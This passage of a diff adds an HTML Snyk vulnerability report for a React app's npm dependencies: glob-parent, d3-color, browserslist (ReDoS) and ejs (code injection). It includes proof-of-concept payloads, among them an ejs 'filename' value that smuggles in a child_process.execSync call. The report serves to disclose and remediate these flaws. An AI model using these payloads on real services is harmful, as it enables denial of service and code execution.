+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        my-app@0.1.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        react-scripts@4.0.3
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        webpack@4.44.2
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        watchpack@1.7.5
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        watchpack-chokidar2@2.0.1
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        chokidar@2.1.8
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        glob-parent@3.1.0
+                                        
+                                </span>
+        
+                            </li>
+                    </ul><!-- .list-paths -->
+        
+            </div><!-- .card__section -->
+        
+              <hr/>
+              <!-- Overview -->
+              <h2 id="overview">Overview</h2>
+        <p><a href="https://www.npmjs.com/package/glob-parent">glob-parent</a> is a package that helps extracting the non-magic parent path from a glob string.
+        Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS). The <code>enclosure</code> regex used to check for strings ending in enclosure containing path separator.</p>
+        <h3 id="poc-by-yeting-li">PoC by Yeting Li</h3>
+        <pre><code>var globParent = require(&quot;glob-parent&quot;)
+        function build_attack(n) {
+        var ret = &quot;{&quot;
+        for (var i = 0; i &lt; n; i++) {
+        ret += &quot;/&quot;
+        }
+        
+        return ret;
+        }
+        
+        globParent(build_attack(5000));
+        </code></pre>
+        <h2 id="details">Details</h2>
+        <p>Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.</p>
+        <p>The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren&#39;t very intuitive and can ultimately end up making it easy for attackers to take your site down.</p>
+        <p>Let’s take the following regular expression as an example:</p>
+        <pre><code class="language-js">regex = /A(B|C+)+D/
+        </code></pre>
+        <p>This regular expression accomplishes the following:</p>
+        <ul>
+        <li><code>A</code> The string must start with the letter &#39;A&#39;</li>
+        <li><code>(B|C+)+</code> The string must then follow the letter A with either the letter &#39;B&#39; or some number of occurrences of the letter &#39;C&#39; (the <code>+</code> matches one or more times). The <code>+</code> at the end of this section states that we can look for one or more matches of this section.</li>
+        <li><code>D</code> Finally, we ensure this section of the string ends with a &#39;D&#39;</li>
+        </ul>
+        <p>The expression would match inputs such as <code>ABBD</code>, <code>ABCCCCD</code>, <code>ABCBCCCD</code> and <code>ACCCCCD</code></p>
+        <p>It most cases, it doesn&#39;t take very long for a regex engine to find a match:</p>
+        <pre><code class="language-bash">$ time node -e &#39;/A(B|C+)+D/.test(&quot;ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD&quot;)&#39;
+        0.04s user 0.01s system 95% cpu 0.052 total
+        
+        $ time node -e &#39;/A(B|C+)+D/.test(&quot;ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX&quot;)&#39;
+        1.79s user 0.02s system 99% cpu 1.812 total
+        </code></pre>
+        <p>The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.</p>
+        <p>Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as <em>catastrophic backtracking</em>.</p>
+        <p>Let&#39;s look at how our expression runs into this problem, using a shorter string: &quot;ACCCX&quot;. While it seems fairly straightforward, there are still four different ways that the engine could match those three C&#39;s:</p>
+        <ol>
+        <li>CCC</li>
+        <li>CC+C</li>
+        <li>C+CC</li>
+        <li>C+C+C.</li>
+        </ol>
+        <p>The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use <a href="https://regex101.com/debugger">RegEx 101 debugger</a> to see the engine has to take a total of 38 steps before it can determine the string doesn&#39;t match.</p>
+        <p>From there, the number of steps the engine must use to validate a string just continues to grow.</p>
+        <table>
+        <thead>
+        <tr>
+        <th>String</th>
+        <th align="right">Number of C&#39;s</th>
+        <th align="right">Number of steps</th>
+        </tr>
+        </thead>
+        <tbody><tr>
+        <td>ACCCX</td>
+        <td align="right">3</td>
+        <td align="right">38</td>
+        </tr>
+        <tr>
+        <td>ACCCCX</td>
+        <td align="right">4</td>
+        <td align="right">71</td>
+        </tr>
+        <tr>
+        <td>ACCCCCX</td>
+        <td align="right">5</td>
+        <td align="right">136</td>
+        </tr>
+        <tr>
+        <td>ACCCCCCCCCCCCCCX</td>
+        <td align="right">14</td>
+        <td align="right">65,553</td>
+        </tr>
+        </tbody></table>
+        <p>By the time the string includes 14 C&#39;s, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.</p>
+        <h2 id="remediation">Remediation</h2>
+        <p>Upgrade <code>glob-parent</code> to version 5.1.2 or higher.</p>
+        <h2 id="references">References</h2>
+        <ul>
+        <li><a href="https://github.com/gulpjs/glob-parent/pull/36">GitHub PR</a></li>
+        <li><a href="https://github.com/gulpjs/glob-parent/releases/tag/v5.1.2">GitHub Release</a></li>
+        </ul>
+        
+              <hr/>
+        
+            <div class="cta card__cta">
+                <p><a href="https://snyk.io/vuln/SNYK-JS-GLOBPARENT-1016905">More about this vulnerability</a></p>
+            </div>
+        
+        </div><!-- .card -->
+        <div class="card card--vuln  disclosure--not-new severity--medium" data-snyk-test="medium">
+            <h2 class="card__title">Arbitrary Code Injection</h2>
+            <div class="card__section">
+        
+                <div class="label label--medium">
+                    <span class="label__text">medium severity</span>
+                </div>
+        
+                <hr/>
+        
+                <ul class="card__meta">
+                    <li class="card__meta__item">
+                        Package Manager: npm
+                    </li>
+                    <li class="card__meta__item">
+                            Vulnerable module:
+        
+                            ejs
+                    </li>
+        
+                    <li class="card__meta__item">Introduced through:
+        
+        
+                                    my-app@0.1.0, react-scripts@4.0.3 and others
+                    </li>
+                </ul>
+        
+                <hr/>
+        
+        
+                        <h3 class="card__section__title">Detailed paths</h3>
+        
+                    <ul class="card__meta__paths">
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        my-app@0.1.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        react-scripts@4.0.3
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        workbox-webpack-plugin@5.1.4
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        workbox-build@5.1.4
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        @surma/rollup-plugin-off-main-thread@1.4.2
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        ejs@2.7.4
+                                        
+                                </span>
+        
+                            </li>
+                    </ul><!-- .list-paths -->
+        
+            </div><!-- .card__section -->
+        
+              <hr/>
+              <!-- Overview -->
+              <h2 id="overview">Overview</h2>
+        <p><a href="https://www.npmjs.com/package/ejs">ejs</a> is a popular JavaScript templating engine.
+        Affected versions of this package are vulnerable to Arbitrary Code Injection via the <code>render</code> and <code>renderFile</code>. If external input is flowing into the <code>options</code> parameter, an attacker is able run arbitrary code. This include the <code>filename</code>, <code>compileDebug</code>, and <code>client</code> option.</p>
+        <h2 id="poc">POC</h2>
+        <pre><code>let ejs = require(&#39;ejs&#39;)
+        ejs.render(&#39;./views/test.ejs&#39;,{
+            filename:&#39;/etc/passwd\nfinally { this.global.process.mainModule.require(\&#39;child_process\&#39;).execSync(\&#39;touch EJS_HACKED\&#39;) }&#39;,
+            compileDebug: true,
+            message: &#39;test&#39;,
+            client: true
+        })
+        </code></pre>
+        <h2 id="remediation">Remediation</h2>
+        <p>Upgrade <code>ejs</code> to version 3.1.6 or higher.</p>
+        <h2 id="references">References</h2>
+        <ul>
+        <li><a href="https://github.com/mde/ejs/commit/abaee2be937236b1b8da9a1f55096c17dda905fd">GitHub Commit</a></li>
+        <li><a href="https://github.com/mde/ejs/issues/571">GitHub Issue</a></li>
+        </ul>
+        
+              <hr/>
+        
+            <div class="cta card__cta">
+                <p><a href="https://snyk.io/vuln/SNYK-JS-EJS-1049328">More about this vulnerability</a></p>
+            </div>
+        
+        </div><!-- .card -->
+        <div class="card card--vuln  disclosure--not-new severity--medium" data-snyk-test="medium">
+            <h2 class="card__title">Regular Expression Denial of Service (ReDoS)</h2>
+            <div class="card__section">
+        
+                <div class="label label--medium">
+                    <span class="label__text">medium severity</span>
+                </div>
+        
+                <hr/>
+        
+                <ul class="card__meta">
+                    <li class="card__meta__item">
+                        Package Manager: npm
+                    </li>
+                    <li class="card__meta__item">
+                            Vulnerable module:
+        
+                            d3-color
+                    </li>
+        
+                    <li class="card__meta__item">Introduced through:
+        
+        
+                                    my-app@0.1.0, react-vis@1.11.12 and others
+                    </li>
+                </ul>
+        
+                <hr/>
+        
+        
+                        <h3 class="card__section__title">Detailed paths</h3>
+        
+                    <ul class="card__meta__paths">
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        my-app@0.1.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        react-vis@1.11.12
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        d3-color@1.4.1
+                                        
+                                </span>
+        
+                            </li>
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        my-app@0.1.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        react-vis@1.11.12
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        d3-interpolate@1.4.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        d3-color@1.4.1
+                                        
+                                </span>
+        
+                            </li>
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        my-app@0.1.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        react-vis@1.11.12
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        d3-scale@1.0.7
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        d3-color@1.4.1
+                                        
+                                </span>
+        
+                            </li>
+                    </ul><!-- .list-paths -->
+        
+            </div><!-- .card__section -->
+        
+              <hr/>
+              <!-- Overview -->
+              <h2 id="overview">Overview</h2>
+        <p><a href="https://www.npmjs.org/package/d3-color">d3-color</a> is a Color spaces! RGB, HSL, Cubehelix, Lab and HCL (Lch).
+        Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the <code>rgb()</code> and <code>hrc()</code> functions. </p>
+        <p>PoC by Yeting Li: </p>
+        <pre><code>var d3Color = require(&quot;d3-color&quot;)
+        // d3Color.rgb(&quot;rgb(255,255,255)&quot;)
+        
+        function build_blank(n) {
+            var ret = &quot;rgb(&quot;
+            for (var i = 0; i &lt; n; i++) {
+                ret += &quot;1&quot;
+            }
+            return ret + &quot;!&quot;;
+        }
+        
+        for(var i = 1; i &lt;= 5000000; i++) {
+            if (i % 1000 == 0) {
+                var time = Date.now();
+                var attack_str = build_blank(i)
+                d3Color.rgb(attack_str)
+                var time_cost = Date.now() - time;
+                console.log(&quot;attack_str.length: &quot; + attack_str.length + &quot;: &quot; + time_cost+&quot; ms&quot;)
+            }
+        }
+        </code></pre>
+        <h2 id="details">Details</h2>
+        <p>Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.</p>
+        <p>The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren&#39;t very intuitive and can ultimately end up making it easy for attackers to take your site down.</p>
+        <p>Let’s take the following regular expression as an example:</p>
+        <pre><code class="language-js">regex = /A(B|C+)+D/
+        </code></pre>
+        <p>This regular expression accomplishes the following:</p>
+        <ul>
+        <li><code>A</code> The string must start with the letter &#39;A&#39;</li>
+        <li><code>(B|C+)+</code> The string must then follow the letter A with either the letter &#39;B&#39; or some number of occurrences of the letter &#39;C&#39; (the <code>+</code> matches one or more times). The <code>+</code> at the end of this section states that we can look for one or more matches of this section.</li>
+        <li><code>D</code> Finally, we ensure this section of the string ends with a &#39;D&#39;</li>
+        </ul>
+        <p>The expression would match inputs such as <code>ABBD</code>, <code>ABCCCCD</code>, <code>ABCBCCCD</code> and <code>ACCCCCD</code></p>
+        <p>It most cases, it doesn&#39;t take very long for a regex engine to find a match:</p>
+        <pre><code class="language-bash">$ time node -e &#39;/A(B|C+)+D/.test(&quot;ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD&quot;)&#39;
+        0.04s user 0.01s system 95% cpu 0.052 total
+        
+        $ time node -e &#39;/A(B|C+)+D/.test(&quot;ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX&quot;)&#39;
+        1.79s user 0.02s system 99% cpu 1.812 total
+        </code></pre>
+        <p>The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.</p>
+        <p>Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as <em>catastrophic backtracking</em>.</p>
+        <p>Let&#39;s look at how our expression runs into this problem, using a shorter string: &quot;ACCCX&quot;. While it seems fairly straightforward, there are still four different ways that the engine could match those three C&#39;s:</p>
+        <ol>
+        <li>CCC</li>
+        <li>CC+C</li>
+        <li>C+CC</li>
+        <li>C+C+C.</li>
+        </ol>
+        <p>The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use <a href="https://regex101.com/debugger">RegEx 101 debugger</a> to see the engine has to take a total of 38 steps before it can determine the string doesn&#39;t match.</p>
+        <p>From there, the number of steps the engine must use to validate a string just continues to grow.</p>
+        <table>
+        <thead>
+        <tr>
+        <th>String</th>
+        <th align="right">Number of C&#39;s</th>
+        <th align="right">Number of steps</th>
+        </tr>
+        </thead>
+        <tbody><tr>
+        <td>ACCCX</td>
+        <td align="right">3</td>
+        <td align="right">38</td>
+        </tr>
+        <tr>
+        <td>ACCCCX</td>
+        <td align="right">4</td>
+        <td align="right">71</td>
+        </tr>
+        <tr>
+        <td>ACCCCCX</td>
+        <td align="right">5</td>
+        <td align="right">136</td>
+        </tr>
+        <tr>
+        <td>ACCCCCCCCCCCCCCX</td>
+        <td align="right">14</td>
+        <td align="right">65,553</td>
+        </tr>
+        </tbody></table>
+        <p>By the time the string includes 14 C&#39;s, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.</p>
+        <h2 id="remediation">Remediation</h2>
+        <p>Upgrade <code>d3-color</code> to version 3.1.0 or higher.</p>
+        <h2 id="references">References</h2>
+        <ul>
+        <li><a href="https://github.com/d3/d3-color/pull/100">Github PR</a></li>
+        <li><a href="https://github.com/d3/d3-color/pull/99">Github PR</a></li>
+        <li><a href="https://github.com/d3/d3-color/pull/89">GitHub PR</a></li>
+        <li><a href="https://github.com/d3/d3-color/releases/tag/v3.1.0">Github Releases</a></li>
+        </ul>
+        
+              <hr/>
+        
+            <div class="cta card__cta">
+                <p><a href="https://snyk.io/vuln/SNYK-JS-D3COLOR-1076592">More about this vulnerability</a></p>
+            </div>
+        
+        </div><!-- .card -->
+        <div class="card card--vuln  disclosure--not-new severity--medium" data-snyk-test="medium">
+            <h2 class="card__title">Regular Expression Denial of Service (ReDoS)</h2>
+            <div class="card__section">
+        
+                <div class="label label--medium">
+                    <span class="label__text">medium severity</span>
+                </div>
+        
+                <hr/>
+        
+                <ul class="card__meta">
+                    <li class="card__meta__item">
+                        Package Manager: npm
+                    </li>
+                    <li class="card__meta__item">
+                            Vulnerable module:
+        
+                            browserslist
+                    </li>
+        
+                    <li class="card__meta__item">Introduced through:
+        
+        
+                                    my-app@0.1.0, react-scripts@4.0.3 and others
+                    </li>
+                </ul>
+        
+                <hr/>
+        
+        
+                        <h3 class="card__section__title">Detailed paths</h3>
+        
+                    <ul class="card__meta__paths">
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        my-app@0.1.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        react-scripts@4.0.3
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        react-dev-utils@11.0.4
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        browserslist@4.14.2
+                                        
+                                </span>
+        
+                            </li>
+                    </ul><!-- .list-paths -->
+        
+            </div><!-- .card__section -->
+        
+              <hr/>
+              <!-- Overview -->
+              <h2 id="overview">Overview</h2>
+        <p><a href="https://www.npmjs.org/package/browserslist">browserslist</a> is a Share target browsers between different front-end tools, like Autoprefixer, Stylelint and babel-env-preset
+        Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) during parsing of queries.</p>
+        <h3 id="poc-by-yeting-li">PoC by Yeting Li</h3>
+        <pre><code>var browserslist = require(&quot;browserslist&quot;)
+        function build_attack(n) {
+            var ret = &quot;&gt; &quot;
+            for (var i = 0; i &lt; n; i++) {
+                ret += &quot;1&quot;
+            }
+            return ret + &quot;!&quot;;
+        }
+        
+        // browserslist(&#39;&gt; 1%&#39;)
+        
+        //browserslist(build_attack(500000))
+        for(var i = 1; i &lt;= 500000; i++) {
+            if (i % 1000 == 0) {
+                var time = Date.now();
+                var attack_str = build_attack(i)
+                try{
+                    browserslist(attack_str);
+                    var time_cost = Date.now() - time;
+                    console.log(&quot;attack_str.length: &quot; + attack_str.length + &quot;: &quot; + time_cost+&quot; ms&quot;);
+                    }
+                catch(e){
+                var time_cost = Date.now() - time;
+                console.log(&quot;attack_str.length: &quot; + attack_str.length + &quot;: &quot; + time_cost+&quot; ms&quot;);
+                }
+            }
+        }
+        </code></pre>
+        <h2 id="details">Details</h2>
+        <p>Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.</p>
+        <p>The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren&#39;t very intuitive and can ultimately end up making it easy for attackers to take your site down.</p>
+        <p>Let’s take the following regular expression as an example:</p>
+        <pre><code class="language-js">regex = /A(B|C+)+D/
+        </code></pre>
+        <p>This regular expression accomplishes the following:</p>
+        <ul>
+        <li><code>A</code> The string must start with the letter &#39;A&#39;</li>
+        <li><code>(B|C+)+</code> The string must then follow the letter A with either the letter &#39;B&#39; or some number of occurrences of the letter &#39;C&#39; (the <code>+</code> matches one or more times). The <code>+</code> at the end of this section states that we can look for one or more matches of this section.</li>
+        <li><code>D</code> Finally, we ensure this section of the string ends with a &#39;D&#39;</li>
+        </ul>
+        <p>The expression would match inputs such as <code>ABBD</code>, <code>ABCCCCD</code>, <code>ABCBCCCD</code> and <code>ACCCCCD</code></p>
+        <p>It most cases, it doesn&#39;t take very long for a regex engine to find a match:</p>
+        <pre><code class="language-bash">$ time node -e &#39;/A(B|C+)+D/.test(&quot;ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD&quot;)&#39;
+        0.04s user 0.01s system 95% cpu 0.052 total
+        
+        $ time node -e &#39;/A(B|C+)+D/.test(&quot;ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX&quot;)&#39;
+        1.79s user 0.02s system 99% cpu 1.812 total
+        </code></pre>
+        <p>The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.</p>
+        <p>Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as <em>catastrophic backtracking</em>.</p>
+        <p>Let&#39;s look at how our expression runs into this problem, using a shorter string: &quot;ACCCX&quot;. While it seems fairly straightforward, there are still four different ways that the engine could match those three C&#39;s:</p>
+        <ol>
+        <li>CCC</li>
+        <li>CC+C</li>
+        <li>C+CC</li>
+        <li>C+C+C.</li>
+        </ol>
+        <p>The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use <a href="https://regex101.com/debugger">RegEx 101 debugger</a> to see the engine has to take a total of 38 steps before it can determine the string doesn&#39;t match.</p>
+        <p>From there, the number of steps the engine must use to validate a string just continues to grow.</p>
+        <table>
+        <thead>
+        <tr>
+        <th>String</th>
+        <th align="right">Number of C&#39;s</th>
+        <th align="right">Number of steps</th>
+        </tr>
+        </thead>
+        <tbody><tr>
+        <td>ACCCX</td>
+        <td align="right">3</td>
+        <td align="right">38</td>
+        </tr>
+        <tr>
+        <td>ACCCCX</td>
+        <td align="right">4</td>
+        <td align="right">71</td>
+        </tr>
+        <tr>
+        <td>ACCCCCX</td>
+        <td align="right">5</td>
+        <td align="right">136</td>
+        </tr>
+        <tr>
+        <td>ACCCCCCCCCCCCCCX</td>
+        <td align="right">14</td>
+        <td align="right">65,553</td>
+        </tr>
+        </tbody></table>
+        <p>By the time the string includes 14 C&#39;s, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.</p>
+        <h2 id="remediation">Remediation</h2>
+        <p>Upgrade <code>browserslist</code> to version 4.16.5 or higher.</p>
+        <h2 id="references">References</h2>
+        <ul>
+        <li><a href="https://github.com/browserslist/browserslist/commit/c091916910dfe0b5fd61caad96083c6709b02d98">GitHub Commit</a></li>
+        <li><a href="https://github.com/browserslist/browserslist/pull/593">GitHub PR</a></li>
+        <li><a href="https://github.com/browserslist/browserslist/blob/e82f32d1d4100d6bc79ea0b6b6a2d281a561e33c/index.js#L472-L474">Vulnerable Regular Expression</a></li>
+        </ul>
+        
+              <hr/>
+        
+            <div class="cta card__cta">
+                <p><a href="https://snyk.io/vuln/SNYK-JS-BROWSERSLIST-1090194">More about this vulnerability</a></p>
+            </div>
+        
+        </div><!-- .card -->
+      </div><!-- cards -->
+    </div>
+  </main><!-- .layout-stacked__content -->
+</body>
+
+</html>
